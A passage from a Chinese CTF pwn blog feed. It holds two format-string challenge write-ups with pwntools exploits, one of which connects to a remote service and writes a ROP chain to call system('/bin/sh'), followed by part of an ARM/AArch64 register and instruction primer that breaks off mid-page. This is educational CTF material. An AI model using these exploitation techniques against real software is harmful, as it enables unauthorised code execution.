eax</span><br></pre></td></tr></table></figure><p><code>2c:0160│</code>对应的参数偏移是48,于是%*48$c,打印0x7ffff7de6083宽度(有点哈人,幸好alarm给了600秒，而且还重定向了错误流)的字符出来</p><p>然后通过<code>16:00b0</code>%n改写<code>1a:00d0</code>为one_gadget</p><p>再然后就要考虑如何将返回流劫持到该处,发现程序会两次回栈,所以可以通过<code>03:0018│</code>修改<code>27:0138</code>处的rbp值,使第二次回栈的时候进入控制的流</p><p>于是<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dev_null = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./se&quot;</span>,stderr=dev_null)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your name: &quot;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;&#x27;b fprintf</span></span><br><span class="line"><span class="string">b *$rebase(0x1335)&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;%*48$c%801983c%26$n%221c%7$hhn\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your phone: &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;yourself!&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;~.\n&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里还有最后一个槛,不算难但要发现着实有点困难</p><p>就是要在栈上构造出一个指向栈上的函数地址的栈,即出现<code>03:0018</code>这样的栈</p><p>正常来到fprintf并没有这样一个栈内存</p><p>不过很巧的是可以发现<code>16:00b0</code>处的值始终指向我们输入的字符的结尾</p><p>而在<code>1a:00d0</code>处有一个函数指针,所以如果刚好发送18个数字字符的话,就能获得一个满足要求的栈内存了</p><h2 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h2><p><code>/dev/null</code> 是一个特殊的设备文件，用于丢弃数据。在Unix-like系统中，<code>/dev/null</code> 表示空设备，写入它的数据会被丢弃，读取它则会立即得到一个文件结尾（End-of-File）。</p><h1 id="2023第六届强网拟态-fmt"><a href="#2023第六届强网拟态-fmt" class="headerlink" title="2023第六届强网拟态-fmt"></a>2023第六届强网拟态-fmt</h1><p><strong>标签:格式化字符串</strong></p><p>这题一个难点在于格式化字符串不在栈上</p><p>当然影响其实并不很大</p><p>首先程序会打印一个栈地址的最后两个字节</p><p>断在printf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffde48</span> —▸ <span class="number">0x555555555250</span> (main+<span class="number">167</span>) ◂— mov edi, <span class="number">0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffde50</span> —▸ <span class="number">0x7fffffffdf50</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fffffffde58</span> ◂— <span class="number">0xafe57b979d2b8b00</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fffffffde68</span> —▸ <span class="number">0x7ffff7de6083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov edi, eax</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffde70</span> ◂— <span class="number">0x50</span> <span class="comment">/* &#x27;P&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fffffffde78</span> —▸ <span class="number">0x7fffffffdf58</span> —▸ <span class="number">0x7fffffffe2aa</span> ◂— <span class="string">&#x27;/home/aichch/pwn/fmt&#x27;</span></span><br></pre></td></tr></table></figure><p>可以发现此时栈上有一个三级栈指针06:0030</p><p>那么先利用%n修改0x7fffffffe2aa为0x7fffffffe248,再利用%n修改0x555555555250为read的地址</p><p>就可以多次利用格式化字符串漏洞了</p><p>泄露,打one_gadget就能完成利用</p><p><strong>exp:(自己写的未完成但大致是这么个思路)</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./fmt&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p=process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">4</span>:],<span class="number">16</span>)-<span class="number">12</span></span><br><span class="line">leak(<span class="string">&quot;stack&quot;</span>,stack)</span><br><span class="line">dbg()</span><br><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>(stack-<span class="number">90</span>).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">r(<span class="number">90</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">leak(<span class="string">&quot;libc&quot;</span>,libc.address)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">text=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x11a9</span></span><br><span class="line">leak(<span class="string">&quot;text:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line">payload=</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>别人的<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;/bin/tmux&quot;</span>,<span class="string">&quot;sp&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">sh, data</span>):</span><br><span class="line">    data = data.ljust(<span class="number">0x100</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">sh, atk_addr, write_data</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> target_addr <span class="keyword">in</span> <span class="built_in">range</span>(atk_addr, atk_addr + <span class="built_in">len</span>(write_data), <span class="number">2</span>):</span><br><span class="line">        idx = target_addr - atk_addr</span><br><span class="line">        part_data = u16(write_data[idx: idx + <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(main) + <span class="string">&quot;%39$hhn&quot;</span></span><br><span class="line">        payload += build((target_addr + <span class="number">0x10000</span> - main) &amp; <span class="number">0xFFFF</span>) + <span class="string">&quot;%27$hn&quot;</span></span><br><span class="line">        fmt(sh, payload)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(main) + <span class="string">&quot;%39$hhn&quot;</span></span><br><span class="line">        payload += build((part_data + <span class="number">0x10000</span> - main) &amp; <span class="number">0xFFFF</span>) + <span class="string">&quot;%41$hn&quot;</span></span><br><span class="line">        fmt(sh, payload)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x23</span></span><br><span class="line">retn = <span class="number">0xC4</span></span><br><span class="line"><span class="comment"># sh = process(&#x27;./fmt&#x27;)</span></span><br><span class="line">sh = remote(sys.argv[<span class="number">1</span>], <span class="number">9999</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Gift: &#x27;</span>)</span><br><span class="line">stack_ret = <span class="built_in">int</span>(sh.recvline(), <span class="number">16</span>) - <span class="number">0xC</span></span><br><span class="line">log.success(<span class="string">&quot;stack_ret:\t&quot;</span> + <span class="built_in">hex</span>(stack_ret))</span><br><span class="line"></span><br><span class="line">first = <span class="string">&quot;%c&quot;</span> * <span class="number">9</span></span><br><span class="line">first += <span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>((stack_ret-<span class="number">9</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">first += <span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>((main - stack_ret) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">fmt(sh, first)</span><br><span class="line"><span class="comment"># sh.interactive()</span></span><br><span class="line"></span><br><span class="line">fmt(sh, <span class="string">&quot;%&#123;&#125;c%39$hhn%9$p%11$p\n&quot;</span>.<span class="built_in">format</span>(main &amp; <span class="number">0xFF</span>))</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">stack = <span class="built_in">int</span>(sh.recvline(), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;stack:\t&quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">stack_rop = stack - <span class="number">0x108</span></span><br><span class="line">pop_rdi_addr = libc_base + <span class="number">0x23b6a</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b45bd</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x52290</span></span><br><span class="line">write_data(sh, stack_rop, p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr))</span><br><span class="line">fmt(sh, <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(retn) + <span class="string">&quot;%39$hhn&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="printf的一个细节问题"><a href="#printf的一个细节问题" class="headerlink" title="printf的一个细节问题"></a>printf的一个细节问题</h2><p>看两段代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%11$hn&quot;</span>.<span class="built_in">format</span>(stack).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>(stack-<span class="number">90</span>).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br></pre></td></tr></table></figure><p>这两段代码的目的,都是两次连接修改来写printf的返回地址</p><p>且效果上看过去是一致的,但实际上第一段代码并不能按照预期工作,仅仅是修改了第一部分的指针，确实做出了一个指向 <code>printf</code> 返回地址的指针，但第二部分通过刚刚做出的指针并没有成功修改掉 <code>printf</code> 函数的返回地址</p><p>原理暂时不清楚,但得出的结论是,要像这样通过修改中间指针来指向修改某一个内存,连接过程不能两个都是用<code>$</code>写法,其中一个得是利用正常顺序排列得出</p><h3 id="非-格式化顺序"><a href="#非-格式化顺序" class="headerlink" title="非$格式化顺序"></a>非$格式化顺序</h3><p><strong>非$指定的%参数单独计数</strong>,按顺序对应各个参数</p><p>例如<code>printf(&quot;%d%2$d%d&quot;,1,2,3)</code></p><p>打印结果是122,即$不加入普通参数的记数</p><p>在本题中就选择以9个%p和1个%c填充,使得%hn对应相对格式化字符串的第11个参数</p>]]></content>
    
    
    <summary type="html">有意思的题目</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="杂题" scheme="https://ixout.github.io/tags/%E6%9D%82%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>常见异架构基础</title>
    <link href="https://ixout.github.io/posts/36717/"/>
    <id>https://ixout.github.io/posts/36717/</id>
    <published>2023-12-03T11:19:57.000Z</published>
    <updated>2023-12-26T04:54:27.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h1><p>CTF比赛中，大部分题的都是x86、x86_64的程序，这类程序是属于Intel处理器支持的</p><p>   但其实，在生活中配置ARM处理器的设备要多得多，比如：Android、网络设备、智能家居等</p><p>Intel和ARM之间的区别主要是指令集</p><p>●CISC 复杂指令集</p><p>●RISC 精简指令集</p><p>   精简指令集通过减少每条指令的时钟周期来缩短执行时间，可以更快的执行指令，但因为指令较少，因此在实现功能时，会显得比Intel冗长</p><p>   其次，在x86上，大多数指令都可以直接对内存中的数据进行操作，而在ARM上，必须先将内存中的数据从内存移到寄存器中，然后再进行操作</p><hr><p>一般我们说的<code>arm</code>是<code>ARMv7</code>架构，是<code>32</code>位，而<code>aarch64</code>是<code>ARMv8</code>架构，也就是<code>64</code>位。</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h3 id="ARM32"><a href="#ARM32" class="headerlink" title="ARM32"></a>ARM32</h3><p>寄存器的数量取决于ARM版本，ARM32有30个通用寄存器（基于ARMv6-M和基于ARMv7-M的处理器除外），前16个寄存器可在用户级模式下访问，其他寄存器可在特权软件执行中使用</p><p>其中，r0-15寄存器可在任何特权模式下访问。这16个寄存器可以分为两组：通用寄存器（R0-R11）和专用寄存器（R12-R15）</p><p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt=""></p><p><strong>普通寄存器</strong>R0-R12：可在常规操作期间用于存储临时值，指针（到存储器的位置）等，例如：</p><p>●<strong>R0</strong>在算术操作期间可称为累加器，或用于<strong>存储先前调用的函数的结果</strong></p><p>●<strong>R7</strong>在处理系统调用时非常有用，因为它<strong>存储系统调用号</strong></p><p>●<strong>R11</strong>帮助我们跟踪<strong>用作帧指针的堆栈的边界</strong></p><p>●ARM上的函数调用约定指定函数的前四个参数存储在寄存器<strong>r0</strong>-<strong>r3</strong>中</p><p><strong>特殊寄存器</strong></p><p><strong>R13</strong>：SP（堆栈指针）。堆栈指针指向堆栈的顶部。堆栈是用于函数特定存储的内存区域，函数返回时将对其进行回收。因此，通过从堆栈指针中减去我们要分配的值（以字节为单位），堆栈指针可用于在堆栈上分配空间。换句话说，如果我们要分配一个32位值，则从堆栈指针中减去4</p><p><strong>R14</strong>：LR（链接寄存器）。进行功能调用时，链接寄存器将使用一个内存地址进行更新，该内存地址引用了从其开始该功能的下一条指令。这样做可以使程序返回到“父”函数，该子函数在“子”函数完成后启动“子”函数调用</p><p><strong>R15</strong>：PC（程序计数器）。程序计数器自动增加执行指令的大小。在ARM状态下，此大小始终为4个字节，<strong>在THUMB模式下，此大小始终为2个字节。</strong>当执行转移指令时，PC保留目标地址。在执行期间，PC在ARM状态下存储当前指令的地址加8（<strong>两个ARM指令</strong>），在Thumb（v1）状态下存储当前指令的地址加4（<strong>两个Thumb指令</strong>）。这与x86不同，x86中PC始终指向要执行的下一条指令</p><p><strong>与x86平行对比</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/asdasdasd1.png" alt=""></p><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><p>1.当参数少于4个时，子程序间通过寄存器R0~R3来传递参数；当参数个数多于4个时，将多余的参数通过数据栈进行传递，入栈顺序与参数顺序正好相反,即从左到右，子程序返回前无需恢复R0~R3的值</p><p>2.在子程序中，使用R4~R11保存局部变量，<strong>若使用需要入栈保存</strong>，<strong>子程序返回前需要恢复这些寄存器</strong>；<u>R12是临时寄存器，使用不需要保存</u></p><p>3.R13用作数据帧指针，记作SP；R14用作链接寄存器，记作LR，<strong>用于保存子程序返回时的地址</strong>；R15是程序计数器，记作PC</p><p>4.ATPCS规定堆栈是满递减堆栈FD；</p><p>5.子程序返回32位的整数，使用R0返回；返回64位整数时，使用R0返回低位，R1返回高位</p><h3 id="AARCH64"><a href="#AARCH64" class="headerlink" title="AARCH64"></a>AARCH64</h3><p>AARCH64也即64位的ARM，从ARMv8开始才有。ARMv8分为aarch32和aarch64两部分。</p><p><img src="https://toleleyjl.github.io/images/%E5%BC%82%E6%9E%84Pwn/pic06.png" alt=""></p><p>aarch64有31个通用寄存器:X0-X30</p><p>低 32 位可以通过 W0-W30 来访问. 当写入 Wy 时, Xy 的高 32 位会被置 0。</p><p><img src="https://toleleyjl.github.io/images/%E5%BC%82%E6%9E%84Pwn/pic07.png" alt=""></p><p>AARCH64标准提供了8个通用寄存器（X0~X7）用于传递函数参数，依次对应于前8个函数参数。超过8个的参数使用堆栈进行参数传递。</p><p>函数的返回值用通用寄存器X0来保存。</p><h3 id="32与64位差异"><a href="#32与64位差异" class="headerlink" title="32与64位差异"></a>32与64位差异</h3><p>​    arm32下，前4个参数是通过r0~r3传递，第4个参数需要通过sp访问，第5个参数需要通过sp + 4 访问，第n个参数需要通过sp + 4*(n-4)访问。</p><p>​    arm64下，前8个参数是通过x0~x7传递，第8个参数需要通过sp访问，第9个参数需要通过sp + 8 访问，第n个参数需要通过sp + 8*(n-8)访问。</p><p>​    ARM指令在32位下和在64位下并不是完全一致的，但大部分指令是通用的，特别的，” mov r2, r1, lsl #2”仅在ARM32下支持，它等同于ARM64的” lsl r2, r1, #2”</p><p>​    还有一些32位存在的指令在64位下是不存在的，比如vswp指令，条件执行指令subgt,addle等</p><p>arm指令集</p><h2 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h2><p>ARM处理器具有两种可以运行的主要状态（此处不包括Jazelle）：<strong>ARM和Thumb</strong></p><p>​    这两种状态之间的主要区别是指令集，<strong>其中ARM状态下的指令始终为32位，Thumb状态下的指令始终为16位（但可以为32位）</strong></p><p>​    现在，ARM引入了增强的Thumb指令集（Thumbv2），该指令集允许32位Thumb指令甚至条件执行，而在此之前的版本中是不可能的，为了在Thumb状态下使用条件执行，引入了“ it”指令。但是，这个指令在后来的版本中被删除并替换成了其他的</p><p>​    在编写ARM shellcode时，我们需要摆脱NULL字节，并使用16位Thumb指令而不是32位ARM指令来减少使用它们的机会。</p><p><strong>Thumb和ARM一样也有不同的版本：</strong></p><p>●Thumb-1（16位指令）：在ARMv6和更早的体系结构中使用</p><p>●Thumb-2（16位和32位指令）：通过添加更多指令并使它们的宽度为16位或32位（ARMv6T2，ARMv7）来扩展Thumb-1</p><p>●ThumbEE：包括一些针对动态生成的代码的更改和添加</p><p><strong>ARM和Thumb之间的区别：</strong></p><p>●条件执行：ARM状态下的所有指令均支持条件执行。某些ARM处理器版本允许使用“it”指令在Thumb中有条件执行。</p><p>●32位ARM和Thumb指令：32位Thumb指令带有.w后缀。</p><p>●桶式移位器（barrel shifter）是ARM模式的另一个独特功能。它可以用于将多个指令缩小为一个。例如，您可以使用左移，而不是使用两条指令，将寄存器乘以2并使用mov将结果存储到另一个寄存器中：mov r1, r0, lsl #1 ; r1 = r0 * 2</p><p><strong>切换处理器执行的状态</strong></p><p>必须满足以下两个条件之一：</p><p>●我们可以使用分支指令BX（分支和交换）或BLX（分支，链接和交换）并将目标寄存器的最低有效位设置为1。这可以通过在偏移量上加上1来实现，例如0x5530 + 1。可能会认为这会导致对齐问题，因为指令是2字节或4字节对齐的。这不是问题，因为处理器将忽略最低有效位</p><p>●我们知道如果当前程序状态寄存器中的T位置1，则我们处于Thumb模式。</p><h3 id="ARM指令初识"><a href="#ARM指令初识" class="headerlink" title="ARM指令初识"></a>ARM指令初识</h3><p>汇编语言由指令构成，而指令是主要的构建块。ARM指令通常后跟一个或两个操作数，并且通常使用以下模板：</p><p>​    MNEMONIC {S} {condition} {Rd}，Operand1，Operand2</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/sadasd3.png" alt=""></p><p>​    注意，由于ARM指令集的灵活性，并非所有指令都使用模板中提供的所有字段。其中，条件字段与CPSR寄存器的值紧密相关，或者确切地说，与寄存器内特定位的值紧密相关</p><p>Operand2被称为灵活操作数，因为我们可以以多种形式使用它，例如，我们可以将这些表达式用作Operand2：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/213asda.png" alt=""></p><p>下面以一些常见指令为例：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/%E5%9B%BE%E7%89%875.png" alt=""></p><h4 id="ARM常用指令"><a href="#ARM常用指令" class="headerlink" title="ARM常用指令"></a>ARM常用指令</h4><div 